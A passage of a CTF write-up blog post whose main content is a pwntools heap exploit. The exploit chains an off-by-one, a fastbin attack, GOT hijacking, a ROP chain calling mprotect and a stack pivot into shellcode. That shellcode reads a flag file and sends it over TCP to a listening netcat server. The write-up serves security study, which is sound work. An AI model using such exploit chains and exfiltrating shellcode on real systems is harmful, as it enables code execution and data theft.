class="keyword">def</span> <span class="title">new</span><span class="params">(size)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"size?"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    sla(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    sla(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line">    sea(<span class="string">"content?"</span>, content)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x58</span>)</span><br><span class="line">new(<span class="number">0x58</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">new(<span class="number">0x100</span>)</span><br><span class="line">new(<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">"A"</span>*<span class="number">0x1f0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"A"</span>*<span class="number">0x58</span>) <span class="comment"># offbyone</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0xa0</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x310</span>)</span><br><span class="line"><span class="comment"># overlapping chunk #2 and #5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>, cyclic(<span class="number">0xa0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + p64(<span class="number">0x6020e0</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x50</span>)</span><br><span class="line">new(<span class="number">0x50</span>)</span><br><span class="line"><span class="comment"># now #5 points to itself, arbitrary R/W</span></span><br><span class="line"><span class="comment"># add some notes so that 32bit program can have same entry.</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#6</span></span><br><span class="line">new(<span class="number">0x300</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">content = p64(<span class="number">0x6020f0</span>) + p64(<span class="number">0x50</span>) <span class="comment">#5</span></span><br><span class="line">content += p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">8</span>) <span class="comment">#6 GOT hijacking</span></span><br><span class="line">content += p64(<span class="number">0x602220</span>) + p64(<span class="number">0x300</span>) <span class="comment">#7 for ROP chain</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, content)</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"><span class="comment"># fake puts: to mimic "Invalid Choice." when enter rop1</span></span><br><span class="line">rop.raw(pop_rdi_ret)</span><br><span class="line">rop.raw(<span class="number">0x400cf3</span>)</span><br><span class="line">rop.raw(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">rop.raw(elf.symbols[<span class="string">'menu'</span>])</span><br><span class="line"><span class="comment"># overwrite read -&gt; mprotect </span></span><br><span class="line">rop.raw(pop_rdi_ret)</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(pop_rsi_r15)</span><br><span class="line">rop.raw(elf.got[<span class="string">'read'</span>])</span><br><span class="line">rop.raw(<span class="number">0</span>)</span><br><span class="line">rop.raw(elf.plt[<span class="string">'read'</span>])</span><br><span class="line"><span class="comment"># fake puts: to mimic "Invalid Choice." when enter partial overwrite bytes.</span></span><br><span class="line">rop.raw(pop_rdi_ret)</span><br><span class="line">rop.raw(<span class="number">0x400cf3</span>)</span><br><span class="line">rop.raw(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">rop.raw(elf.symbols[<span class="string">'menu'</span>])</span><br><span class="line"><span class="comment"># call mprotect</span></span><br><span class="line">rop.raw(pop_rbx_x)</span><br><span class="line">rop.raw(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">rop.raw(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">rop.raw(elf.got[<span class="string">'read'</span>]) <span class="comment"># r12</span></span><br><span class="line">rop.raw(<span class="number">7</span>) <span class="comment"># r13 -&gt; rdx</span></span><br><span class="line">rop.raw(<span class="number">0x1000</span>) <span class="comment"># r14 -&gt; rsi</span></span><br><span class="line">rop.raw(<span class="number">0x602000</span>) <span class="comment"># r15 -&gt; edi</span></span><br><span class="line">rop.raw(mov_call_r12_rbx) <span class="comment"># trigger mprotect(0x602000, 0x1000, 7)</span></span><br><span class="line"></span><br><span class="line">sc = open(<span class="string">'./sc.bin'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">payload = rop.chain() + <span class="string">"A"</span>*<span class="number">56</span> + p64(<span class="number">0x602310</span>) + sc </span><br><span class="line"><span class="comment">#                                    ^-----------shellcode address</span></span><br><span class="line">p.info(<span class="string">"len: %x"</span> % len(payload))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line">edit(<span class="number">6</span>, p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack pivot to bss and enter rop.chain()</span></span><br><span class="line">rop1 = ROP(elf)</span><br><span class="line">rop1.raw(pop_rsp_r13_r14_r15_ret)</span><br><span class="line">rop1.raw(<span class="number">0x602208</span>) </span><br><span class="line"></span><br><span class="line">ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">se(rop1.chain())</span><br><span class="line">ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">se(p16(<span class="number">0xe770</span>)) <span class="comment"># overwrite write-&gt;mprotect</span></span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p><code>sc.bin</code> is a raw shellcode file produced by <code>Binary Ninja</code>‘s great shellcode compiler. Once we reach the shellcode, it reads <code>./flag</code> file and send it to our remote server.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"./flag"</span>, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> s = create_tcp4_connection(IPV4_ADDR(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>), <span class="number">1337</span>);</span><br><span class="line">        read(fd, buf, <span class="number">0x40</span>);</span><br><span class="line">        send_all(s, buf, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The interesting part of exploiting it is how to guarantee the same outputs. So we need to mimic the normal behaviors when receive rop chain or overwriting bytes. We have to use rop to output “Invalid Choice”, otherwise both programs will be killed before we reach our shellcode. Also, the paritial overwrite have about 1/16 chance to success, so I setup <code>nc -lvp 1337</code> on remote server and run the exp in loop on local machine. After a couple of tries, the flag is waitting for us on remote server.</p>
<h2 id="Wrapup"><a href="#Wrapup" class="headerlink" title="Wrapup"></a>Wrapup</h2><p>Mimic defense is an interesting idea, for the pwn challenges with this settting, we should consider using ROP and then a reverse shellcode to get flag.</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/06/上帝给我写信/" rel="next" title="上帝给我写信">
                <i class="fa fa-chevron-left"></i> 上帝给我写信
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/08/27/X-NUCA-2019-Vexx-Qemu-Escape/" rel="prev" title="[X-NUCA 2019] Vexx - Qemu Escape">
                [X-NUCA 2019] Vexx - Qemu Escape <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">🎓</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">65</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-plan"><span class="nav-number">2.</span> <span class="nav-text">Exploit plan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Thoughts"><span class="nav-number">3.</span> <span class="nav-text">Thoughts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp"><span class="nav-number">4.</span> <span class="nav-text">Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wrapup"><span class="nav-number">5.</span> <span class="nav-text">Wrapup</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
